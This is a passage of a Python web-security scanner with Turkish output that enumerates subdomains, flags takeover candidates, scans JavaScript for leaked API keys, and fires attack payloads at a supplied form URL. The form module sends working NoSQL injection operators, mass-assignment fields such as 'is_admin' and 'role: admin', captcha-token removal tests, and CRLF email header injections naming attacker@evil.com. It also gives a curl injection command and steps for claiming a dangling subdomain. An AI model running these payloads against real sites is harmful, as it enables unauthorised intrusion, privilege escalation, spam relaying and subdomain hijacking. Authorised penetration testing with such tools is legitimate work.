    ("shopify.com",      "Sorry, this shop is currently unavailable","Shopify"),
    ("readme.io",        "Project doesnt exist",                  "Readme.io"),
]

COMMON_SUBDOMAINS = [
    "www","mail","ftp","admin","api","dev","staging","test","demo","beta",
    "app","portal","dashboard","blog","shop","store","static","cdn","assets",
    "media","img","images","video","download","docs","support","help","status",
    "vpn","remote","webmail","smtp","mx","ns1","ns2","git","gitlab","jenkins",
    "jira","confluence","grafana","prometheus","kibana","elastic","redis","mongo",
    "mysql","postgres","backup","old","legacy","v2","mobile","m","api2","api-v1",
    "api-v2","internal","intranet","corp","secure","auth","login","sso","id",
]

def check_subdomain_takeover(domain):
    print(f"\n{SEP2}")
    print(f"  {B}{W}  SUBDOMAIN TAKEOVER KONTROLU  {RST}")
    print(f"  {C}Hedef: {W}{domain}{RST}")
    print(SEP2)

    section("1.  SUBDOMAIN KESFI  (DNS bruteforce)", C)
    info(f"{len(COMMON_SUBDOMAINS)} yaygin subdomain kontrol ediliyor...")
    print()

    found_subs = []
    lock = _threading.Lock()
    done = [0]
    total = len(COMMON_SUBDOMAINS)

    def check_sub(sub):
        fqdn = f"{sub}.{domain}"
        try:
            ip = _socket.gethostbyname(fqdn)
            with lock:
                found_subs.append((fqdn, ip))
        except Exception:
            pass
        with lock:
            done[0] += 1
            pct = int(done[0]/total*24)
            bar = G+"x"*pct+DIM+"."*(24-pct)+RST
            _sys.stdout.write(f"\r  {C}>{RST}  [{bar}] {done[0]}/{total}  ")
            _sys.stdout.flush()

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=40) as ex:
        list(ex.map(check_sub, COMMON_SUBDOMAINS))
    print("\n")

    if found_subs:
        ok(f"{len(found_subs)} subdomain bulundu:")
        for fqdn, ip in sorted(found_subs):
            print(f"  {G}*{RST}  {W}{fqdn:<40}{RST}  {DIM}{ip}{RST}")
    else:
        sub(f"{DIM}Yaygin subdomainlerden hicbiri cozumlenmedi.{RST}")

    section("2.  CNAME & TAKEOVER ANALIZI", R)
    has_dig = check_dig_available()
    takeover_candidates = []

    targets_to_check = [fqdn for fqdn,_ in found_subs]

    for fqdn in targets_to_check:
        cname_val = ""
        if has_dig:
            try:
                out = _subprocess.run(["dig","+short","CNAME",fqdn],
                                      capture_output=True, text=True, timeout=4)
                cname_val = out.stdout.strip().rstrip(".")
            except Exception:
                pass

        if not cname_val:
            continue

        for (fp_domain, fp_string, service) in TAKEOVER_FINGERPRINTS:
            if fp_domain in cname_val:
                try:
                    if HAS_REQUESTS:
                        r = requests.get(f"http://{fqdn}", timeout=6,
                                         headers={"User-Agent":"static-killer/1.0"},
                                         allow_redirects=True)
                        body = r.text.lower()
                        if fp_string.lower() in body:
                            takeover_candidates.append((fqdn, cname_val, service))
                            err(f"[TAKEOVER!]  {W}{fqdn}{RST}")
                            sub(f"CNAME   -> {Y}{cname_val}{RST}")
                            sub(f"Servis  -> {R}{service}{RST}")
                            sub(f"Kanitla -> fingerprint '{fp_string[:40]}' yanit govdesinde!")
                        else:
                            warn(f"[SUPHELIJ  {W}{fqdn}{RST}  ->  CNAME: {DIM}{cname_val}{RST}  ({service})")
                            sub(f"Fingerprint bulunamadi ama dangling CNAME var - manuel kontrol onerilir.")
                    else:
                        warn(f"[CNAME VAR]  {W}{fqdn}{RST}  ->  {DIM}{cname_val}{RST}  ({service})")
                        sub(f"Servis mevcut olmayabilir - requests ile dogrulayin.")
                except Exception:
                    warn(f"[CNAME VAR]  {W}{fqdn}{RST}  ->  {DIM}{cname_val}{RST}  ({service})")
                    sub(f"HTTP istegi basarisiz - servis down olabilir ({service})")
                break

    if not takeover_candidates and found_subs:
        ok("Takeover'a acik dangling CNAME tespit edilmedi.")

    section("3.  KANITLAMA NOTU", M)
    if takeover_candidates:
        err(f"{len(takeover_candidates)} adet takeover adayi bulundu!")
        for fqdn, cname_val, service in takeover_candidates:
            print(f"\n  {R}!{RST}  {W}{fqdn}{RST}")
            sub(f"Kanit  : CNAME {cname_val} -> {service} hesabi talep edilmemis")
            sub(f"Adim   : {service} uzerinde '{cname_val.split('.')[0]}' projesi olusturun")
            sub(f"Sonuc  : {fqdn} adresini tamamen kontrol edebilirsiniz")
            sub(f"Cozum  : DNS'ten bu CNAME kaydi kaldirilmali ya da {service} aktif edilmeli")
    else:
        ok("Takeover acigi tespit edilmedi.")
        sub(f"{DIM}Not: Kapsamli tarama icin subfinder + nuclei kullanilmasi onerilir.{RST}")

    print(f"\n{SEP2}\n")


# ─── JS & SECRET TARAMASI ────────────────────────────────

SECRET_PATTERNS = [
    ("AWS Access Key",    r"AKIA[0-9A-Z]{16}",                                                         "KRITIK"),
    ("Google API Key",    r"AIza[0-9A-Za-z\-_]{35}",                                                   "KRITIK"),
    ("Firebase URL",      r"https://[a-z0-9\-]+\.firebaseio\.com",                                     "YUKSEK"),
    ("Stripe Live Key",   r"sk_live_[0-9a-zA-Z]{24,}",                                                 "KRITIK"),
    ("Stripe Pub Key",    r"pk_live_[0-9a-zA-Z]{24,}",                                                 "ORTA"),
    ("GitHub Token",      r"ghp_[0-9a-zA-Z]{36}",                                                      "KRITIK"),
    ("GitHub OAuth",      r"gho_[0-9a-zA-Z]{36}",                                                      "KRITIK"),
    ("Slack Token",       r"xox[baprs]-[0-9a-zA-Z]{10,48}",                                            "YUKSEK"),
    ("Slack Webhook",     r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+",                        "YUKSEK"),
    ("Twilio SID",        r"AC[a-zA-Z0-9]{32}",                                                        "YUKSEK"),
    ("SendGrid Key",      r"SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}",                             "YUKSEK"),
    ("Mailchimp Key",     r"[0-9a-f]{32}-us[0-9]{1,2}",                                                "ORTA"),
    ("JWT Token",         r"eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}",      "YUKSEK"),
    ("Basic Auth URL",    r"https?://[a-zA-Z0-9_\-]+:[a-zA-Z0-9_\-]+@",                               "KRITIK"),
    ("Private Key",       r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",                            "KRITIK"),
    ("Password in Var",   r"(?i)(?:password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{4,}['\"]",               "YUKSEK"),
    ("Secret in Var",     r"(?i)(?:secret|api_secret|client_secret)\s*[:=]\s*['\"][^'\"]{6,}['\"]",   "YUKSEK"),
    ("Internal IP:Port",  r"(?i)(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+):[0-9]{2,5}",             "ORTA"),
    ("TODO Secret Note",  r"(?i)//\s*(?:TODO|FIXME|HACK|XXX).{0,60}(?:key|secret|token|password)",    "ORTA"),
    ("Azure Storage",     r"DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+",        "KRITIK"),
    ("Backend API Var",   r"(?i)(?:api_url|apiUrl|baseUrl|BASE_URL)\s*[:=]\s*['\"]https?://[^'\"]+['\"]","ORTA"),
]

RISK_DISPLAY = {"KRITIK": ("KRİTİK","err"), "YUKSEK": ("YÜKSEK","warn"), "ORTA": ("ORTA","warn")}

def extract_js_urls(base_url):
    if not HAS_REQUESTS:
        return []
    try:
        r = requests.get(base_url, timeout=8, headers={"User-Agent":"static-killer/1.0"})
        scripts = _re.findall(r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>', r.text, _re.I)
        from urllib.parse import urljoin
        return [urljoin(base_url, s) for s in scripts if urljoin(base_url, s).startswith("http")]
    except Exception:
        return []

def scan_js_content(js_url, content):
    findings = []
    for name, pattern, risk in SECRET_PATTERNS:
        try:
            for m in _re.findall(pattern, content):
                snippet = (m if isinstance(m, str) else str(m))[:80]
                findings.append((name, risk, snippet, js_url))
        except _re.error:
            pass
    return findings

def js_secret_scan(target):
    url  = normalize_url(target)

    print(f"\n{SEP2}")
    print(f"  {B}{W}  JS & SECRET TARAMASI  {RST}")
    print(f"  {C}Hedef: {W}{url}{RST}")
    print(SEP2)

    if not HAS_REQUESTS:
        err("requests kurulu degil: pip install requests"); return

    section("1.  JS DOSYALARI TESPITI", C)
    js_urls = spinner_run(lambda: extract_js_urls(url),
                          "Ana sayfa taranıyor, script etiketleri aranıyor...")

    if not js_urls:
        warn("Script etiketi bulunamadi veya erisim basarisiz.")
    else:
        ok(f"{len(js_urls)} JS dosyasi tespit edildi:")
        for u in js_urls[:15]:
            sub(f"{C}{u}{RST}")
        if len(js_urls) > 15:
            sub(f"{DIM}... ve {len(js_urls)-15} tane daha{RST}")

    # Inline scriptleri de topla
    inline_combined = ""
    try:
        r = requests.get(url, timeout=8, headers={"User-Agent":"static-killer/1.0"})
        inlines = _re.findall(r'<script(?![^>]+src)[^>]*>(.*?)</script>', r.text, _re.S|_re.I)
        inline_combined = "\n".join(inlines)
    except Exception:
        pass

    section("2.  SECRET / API KEY TARAMASI", R)
    all_findings = []

    if inline_combined.strip():
        hits = scan_js_content("[inline-scripts]", inline_combined)
        all_findings.extend(hits)
        if hits:
            warn(f"Inline script'lerde {len(hits)} bulgu!")

    info(f"{min(len(js_urls),20)} JS dosyasi indiriliyor ve taranıyor...\n")
    scanned = 0
    for js_url in js_urls[:20]:
        try:
            r = requests.get(js_url, timeout=8, headers={"User-Agent":"static-killer/1.0"})
            if r.status_code == 200:
                hits = scan_js_content(js_url, r.text)
                all_findings.extend(hits)
                scanned += 1
                short = js_url.split("/")[-1][:50] or js_url[-50:]
                flag  = f" {R}[{len(hits)} bulgu!]{RST}" if hits else f" {DIM}[temiz]{RST}"
                print(f"  {G}+{RST}  {DIM}{short}{RST}{flag}")
        except Exception as e:
            short = js_url.split("/")[-1][:50]
            print(f"  {Y}!{RST}  {DIM}{short}  -- {str(e)[:35]}{RST}")

    section("3.  BULGULAR", M)
    if all_findings:
        risk_order = {"KRITIK":0,"YUKSEK":1,"ORTA":2}
        all_findings.sort(key=lambda x: risk_order.get(x[1],9))
        err(f"{len(all_findings)} potansiyel secret/bilgi sizintisi!\n")
        seen = set()
        for name, risk, snippet, src_url in all_findings:
            dedup_key = (name, snippet[:30])
            if dedup_key in seen:
                continue
            seen.add(dedup_key)
            label, badge_fn = RISK_DISPLAY.get(risk, ("?","warn"))
            risk_b = badge_err(label) if badge_fn=="err" else badge_warn(label)
            short_src = src_url.split("/")[-1][:35] or "[inline]"
            print(f"  {R}*{RST}  {risk_b}  {W}{name}{RST}")
            sub(f"Kaynak  : {DIM}{short_src}{RST}")
            sub(f"Snippet : {Y}{snippet}{RST}")
            print()
    else:
        ok("Bilinen patternlarla esleşen secret/key bulunamadi.")
        sub(f"{DIM}Not: Minified/obfuscated JS icindeki gizli degerler tespit edilemeyebilir.{RST}")

    section("4.  OZET", M)
    kritik = sum(1 for _,r,_,_ in all_findings if r=="KRITIK")
    yuksek = sum(1 for _,r,_,_ in all_findings if r=="YUKSEK")
    orta   = sum(1 for _,r,_,_ in all_findings if r=="ORTA")
    ok(f"Taranan JS dosyasi : {scanned}")
    if kritik: err(f"KRITIK bulgular    : {kritik}")
    if yuksek: warn(f"YUKSEK bulgular    : {yuksek}")
    if orta:   info(f"ORTA bulgular      : {orta}")
    if not all_findings: ok("Toplam bulgu       : 0  -- temiz")

    print(f"\n{SEP2}\n")



# ─── 7. FORM LOGIC TEST MODÜLÜ ──────────────────────────
import re as _re
import json as _json
import urllib.parse as _urlparse
import time as _time

def _disable_ssl_warn():
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except Exception:
        pass

def _parse_form(raw):
    raw = raw.strip()
    action_url = None
    body_raw   = raw
    lines      = raw.splitlines()

    if lines and _re.match(r'^(POST|GET|PUT|PATCH)\s+', lines[0], _re.I):
        parts = lines[0].split()
        path  = parts[1] if len(parts) > 1 else "/"
        host  = ""
        for line in lines[1:]:
            if not line.strip(): break
            if line.lower().startswith("host:"):
                host = line.split(":",1)[1].strip(); break
        if host:
            action_url = "https://" + host + path
        for i, line in enumerate(lines):
            if line.strip() == "" and i > 0:
                body_raw = "\n".join(lines[i+1:]).strip(); break

    if body_raw.startswith("{"):
        try:
            d = _json.loads(body_raw)
            if isinstance(d, dict): return d, "json", action_url
        except Exception: pass

    if "&" in body_raw or "=" in body_raw:
        try:
            d = dict(_urlparse.parse_qsl(body_raw, keep_blank_values=True))
            if d: return d, "urlencoded", action_url
        except Exception: pass

    return {}, "unknown", action_url


def _send(action_url, fields, form_type, override=None):
    if not HAS_REQUESTS: return None
    _disable_ssl_warn()
    import warnings; warnings.filterwarnings("ignore")

    data = dict(fields)
    if override:
        for k, v in override.items():
            if v is None:
                data.pop(k, None)
            else:
                data[k] = v

    hdrs = {
        "User-Agent": "Mozilla/5.0 (static-killer/1.0)",
        "Accept": "application/json, text/html, */*",
    }
    t0 = _time.time()
    try:
        if form_type == "json":
            hdrs["Content-Type"] = "application/json"
            r = requests.post(action_url, json=data, headers=hdrs,
                              timeout=10, verify=False, allow_redirects=False)
        else:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            r = requests.post(action_url, data=data, headers=hdrs,
                              timeout=10, verify=False, allow_redirects=False)
        elapsed = int((_time.time() - t0) * 1000)
        return r.status_code, r.text, r.headers, elapsed
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT", {}, int((_time.time()-t0)*1000)
    except Exception:
        return None


def _rline(status, elapsed, verdict_ok=None, verdict_warn=None):
    if verdict_ok:
        print(f"  {G}  v  HTTP {status}  |  {elapsed}ms  =>  {verdict_ok}{RST}")
    elif verdict_warn:
        print(f"  {Y}  ?  HTTP {status}  |  {elapsed}ms  =>  {verdict_warn}{RST}")
    else:
        print(f"  {DIM}  x  HTTP {status}  |  {elapsed}ms{RST}")


# ─── TEST A: NoSQL Injection ──────────────────────────────

def _test_nosql(action_url, fields, form_type, text_fields):
    section("A.  NoSQL INJECTION", R)
    sub("Mantik: MongoDB $gt/$ne/$regex operatoru ile filtre atlama")
    sub("Hedef : " + ", ".join(text_fields))
    print()

    base = _send(action_url, fields, form_type)
    baseline_st = base[0] if base else 200

    json_payloads = [
        ("$gt bos string",  {"$gt": ""}),
        ("$ne null",        {"$ne": None}),
        ("$regex wildcard", {"$regex": ".*"}),
        ("$exists true",    {"$exists": True}),
    ]
    str_payloads = [
        ("Sleep probe",   "';sleep(5000);//"),
        ("OR true",       "' || 'a'=='a"),
    ]

    findings = []
    for field in text_fields:
        print(f"  {C}>>  {W}{field}{RST}")
        for p_name, p_val in json_payloads:
            if form_type == "json":
                override = {field: p_val}
            else:
                override = {field: str(p_val)}
            r = _send(action_url, fields, form_type, override)
            if not r: continue
            status, body, hdrs, elapsed = r
            b = body.lower()
            data_leak = any(x in b for x in ["email","password","_id","user","admin","mongo","bson"])
            if status in (200,201,202) and data_leak:
                _rline(status, elapsed,
                       verdict_ok="[KRITIK] NoSQL Injection! Veri sizintisi var → " + p_name)
                findings.append(("NoSQL Injection", field, p_name, str(p_val),
                                 "200/201 + veri sizintisi"))
            elif status >= 500:
                _rline(status, elapsed,
                       verdict_warn="[ORTA] " + p_name + " → 500 hatasi, injection kabul edildi")
                findings.append(("NoSQL Injection (500)", field, p_name, str(p_val),
                                 "HTTP " + str(status)))
            elif form_type == "json" and status in (200,201,202) and isinstance(p_val, dict):
                _rline(status, elapsed,
                       verdict_warn="[SUPHE] " + p_name + " → JSON obje kabul edildi, manuel dogrula")
                findings.append(("NoSQL (suphe)", field, p_name, str(p_val),
                                 "JSON obje kabul edildi, HTTP " + str(status)))
            else:
                print(f"  {DIM}    {p_name:<32} -> {status} {elapsed}ms{RST}")

        for p_name, p_val in str_payloads:
            r = _send(action_url, fields, form_type, {field: p_val})
            if not r: continue
            status, body, hdrs, elapsed = r
            if status >= 500:
                _rline(status, elapsed, verdict_warn="[ORTA] " + p_name + " → 500 hatasi")
                findings.append(("NoSQL String", field, p_name, p_val,
                                 "HTTP " + str(status)))
            else:
                print(f"  {DIM}    {p_name:<32} -> {status} {elapsed}ms{RST}")
        print()
    return findings


# ─── TEST B: Mass Assignment ──────────────────────────────

def _test_mass_assignment(action_url, fields, form_type):
    section("B.  MASS ASSIGNMENT (Toplu Atama)", Y)
    sub("Mantik: Formda olmayan gizli alanlari JSON'a ekle")
    sub("Sunucu bunlari kabul edip response'a yansitirsa zafiyet var")
    print()

    base = _send(action_url, fields, form_type)
    baseline_st = base[0] if base else 200

    extra = {
        "is_admin":    True,
        "role":        "admin",
        "verified":    True,
        "status":      "approved",
        "active":      True,
        "is_staff":    True,
        "priority":    "high",
        "approved":    True,
        "rank":        "superuser",
    }

    findings = []
    for fname, fval in extra.items():
        r = _send(action_url, fields, form_type, {fname: fval})
        if not r: continue
        status, body, hdrs, elapsed = r
        b = body.lower()
        reflected = fname.lower() in b or str(fval).lower() in b
        accepted  = status in (200,201,202)

        if accepted and reflected:
            _rline(status, elapsed,
                   verdict_ok="[KRITIK] Mass Assignment! '" + fname + "=" + str(fval) + "' response'a yansidi")
            findings.append(("Mass Assignment", fname, str(fval),
                              "HTTP " + str(status) + " — response'ta goruldu"))
        elif accepted:
            _rline(status, elapsed,
                   verdict_warn="[SUPHE] '" + fname + "=" + str(fval) + "' " + str(status) + " ile kabul edildi")
            findings.append(("Mass Assignment (suphe)", fname, str(fval),
                              "HTTP " + str(status) + " — admin paneli kontrol edin"))
        else:
            print(f"  {DIM}    {fname:<20} = {str(fval):<10} -> {status} reddedildi{RST}")
    print()
    return findings


# ─── TEST C: ReCAPTCHA Bypass ─────────────────────────────

def _test_recaptcha_bypass(action_url, fields, form_type):
    section("C.  RECAPTCHA BYPASS (Logic Flaw)", Y)
    sub("Mantik: Token'i sil/bosalt, sunucu yine 201 verirse dogrulama yok demektir")
    print()

    base = _send(action_url, fields, form_type)
    baseline_st = base[0] if base else 200
    print(f"  {DIM}  Baseline HTTP: {baseline_st}{RST}\n")

    recap_fields = [k for k in fields
                    if any(x in k.lower() for x in
                           ["recaptcha","g-recaptcha","captcha","token","recaptcha_type"])]
    if not recap_fields:
        warn("Formda recaptcha/captcha alani bulunamadi.")
        return []

    ok("Captcha alanlari: " + ", ".join(recap_fields))
    print()

    tests = [
        ("Token tamamen silindi",       {f: None             for f in recap_fields}),
        ("Token bos string",            {f: ""               for f in recap_fields}),
        ("Token 'null' string",         {f: "null"           for f in recap_fields}),
        ("Token '0'",                   {f: "0"              for f in recap_fields}),
        ("Token 'invalid_token_abc'",   {f: "invalid_token_abc" for f in recap_fields}),
        ("Token 10x 'a'",               {f: "aaaaaaaaaa"     for f in recap_fields}),
    ]

    findings = []
    for t_name, override in tests:
        r = _send(action_url, fields, form_type, override)
        if not r: continue
        status, body, hdrs, elapsed = r

        if status in (200,201,202) and status == baseline_st:
            _rline(status, elapsed,
                   verdict_ok="[KRITIK] ReCAPTCHA Bypass! " + t_name + " => " + str(status))
            findings.append(("ReCAPTCHA Bypass", t_name,
                              "HTTP " + str(status) + " — token yokken de kabul etti"))
        elif status == baseline_st:
            _rline(status, elapsed,
                   verdict_warn="[ORTA] " + t_name + " => " + str(status) + " (baseline ile ayni)")
            findings.append(("ReCAPTCHA Bypass (orta)", t_name, "HTTP " + str(status)))
        else:
            print(f"  {DIM}    {t_name:<42} -> {status} {elapsed}ms  (farkli yanit){RST}")
    print()
    return findings


# ─── TEST D: Email Header Injection ──────────────────────

def _test_email_header_injection(action_url, fields, form_type):
    section("D.  EMAIL HEADER INJECTION", R)
    sub("Mantik: subject/name alanina CRLF + Bcc/Cc header enjekte et")
    sub("Sunucu maili gondermeden once sanitize etmiyorsa spam relay olur")
    print()

    target_fields = [k for k in fields
                     if any(x in k.lower() for x in
                            ["subject","name","from","reply","title","konu",
                             "mail","email","first","last","message","content"])]
    if not target_fields:
        warn("Hedef alan bulunamadi.")
        return []

    ok("Test edilecek alanlar: " + ", ".join(target_fields))
    print()

    payloads = [
        ("CRLF + Bcc",        "Test\r\nBcc: attacker@evil.com"),
        ("LF + Bcc",          "Test\nBcc: attacker@evil.com"),
        ("CRLF + Cc",         "Test\r\nCc: attacker@evil.com"),
        ("LF + To inject",    "Test\nTo: victim@evil.com"),
        ("CRLF + From spoof", "Test\r\nFrom: ceo@target.com"),
        ("Encoded CRLF",      "Test%0d%0aBcc: attacker@evil.com"),
        ("Double encoded",    "Test%250d%250aBcc: attacker@evil.com"),
        ("Header+body sep",   "Test\r\n\r\nSpam body injected"),
    ]

    base = _send(action_url, fields, form_type)
    baseline_st = base[0] if base else 200

    findings = []
    for field in target_fields:
        print(f"  {C}>>  {W}{field}{RST}")
        for p_name, payload in payloads:
            r = _send(action_url, fields, form_type, {field: payload})
            if not r: continue
            status, body, hdrs, elapsed = r
            b = body.lower()
            in_body   = "bcc:" in b or "cc:" in b or "attacker" in b
            accepted  = status in (200,201,202)
            sanitized = status in (400,422,403)

            if accepted and in_body:
                _rline(status, elapsed,
                       verdict_ok="[KRITIK] Header Injection! Payload response'ta goruldu!")
                findings.append(("Email Header Injection", field, p_name, payload,
                                  "Response'ta Bcc/Cc yansidi"))
            elif accepted and status == baseline_st:
                _rline(status, elapsed,
                       verdict_warn="[SUPHE] " + p_name + " => " + str(status) + " kabul edildi — kendi mailine Bcc ile test et!")
                findings.append(("Email Header Injection (suphe)", field, p_name, payload,
                                  "HTTP " + str(status) + " — kendi mailine Bcc: ekleyerek dogrula"))
            elif sanitized:
                print(f"  {DIM}    {p_name:<38} -> {status} sanitize (iyi){RST}")
            else:
                print(f"  {DIM}    {p_name:<38} -> {status} {elapsed}ms{RST}")
        print()
    return findings


# ─── ANA FONKSİYON ───────────────────────────────────────

def form_logic_test(filepath=None):
    print(f"\n{SEP2}")
    print(f"  {B}{W}  FORM LOGIC TEST MODULU  {RST}")
    print(SEP2)

    _disable_ssl_warn()

    section("1.  FORM VERISI YUKLEME", C)
    raw = None
    if filepath:
        try:
            with open(filepath, "r", encoding="utf-8") as fh:
                raw = fh.read()
            ok("Dosya okundu: " + filepath)
        except Exception as e:
            err("Dosya okunamadi: " + str(e)); return
    else:
        print(f"\n  {C}>{RST}  Burp raw request, JSON veya URL-encoded yapistirin.")
        print(f"  {DIM}  Ctrl+D (Mac/Linux) / Ctrl+Z+Enter (Win) ile bitir{RST}\n")
        lines = []
        try:
            while True: lines.append(input())
        except EOFError: pass
        raw = "\n".join(lines)

    if not raw.strip():
        err("Form verisi bos."); return

    section("2.  FORM PARSE", C)
    fields, form_type, action_url = _parse_form(raw)
    if not fields:
        err("Parse edilemedi. JSON veya URL-encoded format girin."); return

    ok("Format      : " + form_type.upper())
    ok("Alan sayisi : " + str(len(fields)))

    if action_url:
        ok("Action URL  : " + action_url)
    else:
        warn("URL bulunamadi.")
        action_url = input(f"\n  {G}>{RST} Hedef URL: ").strip()
        if not action_url: err("URL girilmedi."); return
        action_url = normalize_url(action_url)

    print(f"\n  {DIM}  Alanlar:{RST}")
    for k, v in fields.items():
        vd = str(v)
        vd = vd[:55] + "..." if len(vd) > 55 else vd
        print(f"  {DIM}  {k:<28} = {vd}{RST}")

    section("3.  TEST KATEGORILERI", M)
    print(f"  {G}1{RST}  NoSQL Injection       -- MongoDB operatoru ile filtre atlama")
    print(f"  {Y}2{RST}  Mass Assignment       -- Gizli alan enjeksiyonu (is_admin, role...)")
    print(f"  {Y}3{RST}  ReCAPTCHA Bypass      -- Token silme/bosaltma ile dogrulama atlama")
    print(f"  {R}4{RST}  Email Header Injection -- CRLF ile Bcc/Cc header enjeksiyonu")
    print(f"  {DIM}a{RST}  Hepsi\n")

    sel = input(f"  {G}>{RST} Secim (ornek: 1,3 veya a): ").strip().lower()
    if sel in ("", "a"):
        run = ["nosql", "mass", "recap", "email"]
    else:
        mapping = {"1": "nosql", "2": "mass", "3": "recap", "4": "email"}
        run = [mapping[x.strip()] for x in sel.split(",") if x.strip() in mapping]
    if not run:
        warn("Gecersiz secim, hepsi secildi.")
        run = ["nosql", "mass", "recap", "email"]

    text_fields = [k for k in fields
                   if not any(x in k.lower() for x in
                               ["recaptcha","csrf","token","gdpr","pdpl","recaptcha_type","_method"])]

    all_findings = []
    if "nosql"  in run: all_findings += _test_nosql(action_url, fields, form_type, text_fields)
    if "mass"   in run: all_findings += _test_mass_assignment(action_url, fields, form_type)
    if "recap"  in run: all_findings += _test_recaptcha_bypass(action_url, fields, form_type)
    if "email"  in run: all_findings += _test_email_header_injection(action_url, fields, form_type)

    section("5.  OZET RAPOR", M)
    if not all_findings:
        ok("Otomatik tespit: dogrudan zafiyet bulgsu yok.")
        sub(f"{DIM}Suphe bulgulari icin asagidaki manuel adimlari uygulayarak kanitlayin.{RST}")
    else:
        err(str(len(all_findings)) + " bulgu:\n")
        for item in all_findings:
            vuln_name = item[0]
            rc = R if any(x in vuln_name for x in ["KRITIK","Injection","Bypass"]) else Y
            print(f"  {rc}*{RST}  {W}{vuln_name}{RST}")
            for detail in item[1:]:
                print(f"     {DIM}{detail}{RST}")
            print()

    section("6.  MANUEL DOGRULAMA REHBERI", G)
    guides = {
        "nosql": [
            'NoSQL Injection kaniti:',
            '  curl -X POST URL -H "Content-Type: application/json"',
            '  -d \'{"email": {"$gt": ""}, "message": "test", ...}\'',
            '  -> 200 + veri dolu geliyorsa injection confirmed',
            '  -> "CastError" veya "MongoError" gorurseniz MongoDB kullaniliyor',
        ],
        "mass": [
            'Mass Assignment kaniti:',
            '  JSON body icine {"is_admin": true, "role": "admin"} ekleyin',
            '  Response body veya admin panelinde degisiklik oldu mu bakin',
            '  Profil sayfanizda "admin" veya "verified" gorunduyse zafiyet var',
        ],
        "recap": [
            'ReCAPTCHA Bypass kaniti:',
            '  recaptcha_token alanini tamamen silerek istek gonderin',
            '  Yine 201 geliyorsa bypass confirmed — bot spam saldirilarına acik!',
            '  Ayni tokeni 10 kez gonderin → hepsinde 201 = replay attack mumkun',
        ],
        "email": [
            'Email Header Injection kaniti:',
            '  subject alanina: "Test\\r\\nBcc: KENDI-MAILINIZ@gmail.com" yazin',
            '  Form gonderin, mail kutunuzu kontrol edin',
            '  Mail geldiyse injection confirmed — kurumsal spam relay acigi!',
        ],
    }
    for key in run:
        if key in guides:
            for line in guides[key]:
                color = C if line.endswith(":") else DIM
                print(f"  {color}{line}{RST}")
            print()

    print(f"\n{SEP2}\n")


# ─── ANA MENÜ ─────────────────────────────────────────────

def menu():
    print_banner()
    while True:
        print(f"  {G}1{RST}  HTTP/HTTPS Analiz   -- TLS, headerlar, kanit/PoC uretimi")
        print(f"  {C}2{RST}  DNS Sorgulama       -- A/MX/NS/TXT, SPF/DMARC/DKIM, zone transfer")
        print(f"  {Y}3{RST}  Port Tarama         -- yaygin portlar, banner grabbing, risk analizi")
        print(f"  {M}4{RST}  Subdomain Takeover  -- subdomain kesfi + dangling CNAME tespiti")
        print(f"  {R}5{RST}  JS & Secret Tarama  -- JS dosyalarinda API key/secret/endpoint arama")
        print(f"  {C}6{RST}  Form Logic Testi    -- NoSQL/MassAssign/ReCAPTCHA/EmailHeader")
        print(f"  {W}7{RST}  Tam Tarama          -- hepsini sirayla calistir")
        print(f"  {DIM}q{RST}  Cikis\n")

        choice = input(f"  {G}>{RST} Secim: ").strip().lower()
        if choice == "q":
            print(f"\n  {DIM}Gorusuruz.{RST}\n"); break
        elif choice == "1":
            t = input(f"  {G}>{RST} Hedef URL: ").strip()
            if t: http_analyze(t)
        elif choice == "2":
            t = input(f"  {G}>{RST} Domain: ").strip()
            if t: dns_analyze(t)
        elif choice == "3":
            t = input(f"  {G}>{RST} Hedef (domain/IP): ").strip()
            if not t: continue
            custom = input(f"  {G}>{RST} Ozel port listesi? (bos=varsayilan, ornek: 22,80,443): ").strip()
            ports = None
            if custom:
                try:    ports = [int(x.strip()) for x in custom.split(",")]
                except ValueError: warn("Gecersiz format, varsayilan kullaniliyor.")
            port_scan(t, ports)
        elif choice == "4":
            t = input(f"  {G}>{RST} Hedef domain: ").strip()
            if t: check_subdomain_takeover(t)
        elif choice == "5":
            t = input(f"  {G}>{RST} Hedef URL: ").strip()
            if t: js_secret_scan(t)
        elif choice == "6":
            fp = input(f"  {G}>{RST} Form dosyasi (bos birak = yapistir): ").strip()
            form_logic_test(fp if fp else None)
        elif choice == "7":
            t = input(f"  {G}>{RST} Hedef (URL veya domain): ").strip()
            if t:
                http_analyze(normalize_url(t))
                dns_analyze(t)
                port_scan(t)
                check_subdomain_takeover(t)
                js_secret_scan(normalize_url(t))
        else:
            warn("Gecersiz secim.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower(); target = sys.argv[2] if len(sys.argv) > 2 else ""
        if   cmd=="http" and target: http_analyze(target)
        elif cmd=="dns"  and target: dns_analyze(target)
        elif cmd=="port" and target:
            ports=None
            if len(sys.argv)>3:
                try: ports=[int(x) for x in sys.argv[3].split(",")]
                except ValueError: pass
            port_scan(target, ports)
        elif cmd=="subdomain" and target: check_subdomain_takeover(target)
        elif cmd=="js" and target: js_secret_scan(normalize_url(target))
        elif cmd=="form" and target: form_logic_test(target)
        elif cmd=="all" and target:
            http_analyze(normalize_url(target)); dns_analyze(target); port_scan(target)
            check_subdomain_takeover(target); js_secret_scan(normalize_url(target))
        else:
            print("Kullanim : python3 static_killer.py [http|dns|port|subdomain|js|form|all] <hedef>")
            print("Ornek    : python3 static_killer.py form form.txt")
            print("Ornek    : python3 static_killer.py js https://example.com")
    else:
        menu()

